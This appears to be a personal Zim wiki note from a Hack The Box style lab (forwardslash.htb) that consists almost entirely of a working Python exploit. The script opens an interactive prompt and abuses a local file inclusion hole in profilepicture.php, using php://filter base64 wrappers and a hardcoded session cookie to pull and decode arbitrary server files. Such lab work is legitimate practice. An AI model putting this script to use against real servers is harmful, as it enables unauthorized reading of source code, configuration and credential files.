Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.4
Creation-Date: 2020-07-11T04:03:15-04:00

====== cmd&request&lfi ======
Created Saturday 11 July 2020

{{./pasted_image.png}}


**import requests**
**from cmd import Cmd**
**from base64 import b64decode**

**URl = 'http://backup.forwardslash.htb/profilepicture.php'**
**VULN_ARG = 'url'**
**COOKIE = { 'PHPSESSID' : 'p8rf473l41lomc5opl4tq26n7i' }**


**class terminal(Cmd):**
    
**    prompt = "OXY => "**
**    def default(self,line):**
**        print(get_source(line))**

**def get_source(file_name):**
**	lfi= "php://filter/convert.base64-encode/resource=" + file_name**
**	data = {VULN_ARG : lfi}**

**	try:**
**		req = requests.post(URl, data=data, cookies = COOKIE)**
**		req = (req.text).splitlines()[-1]**
**		return b64decode(req).decode()**
**	except:**
**		return False**
**	return lfi**



**if __name__ == '__main__':**
**    terminal().cmdloop()**




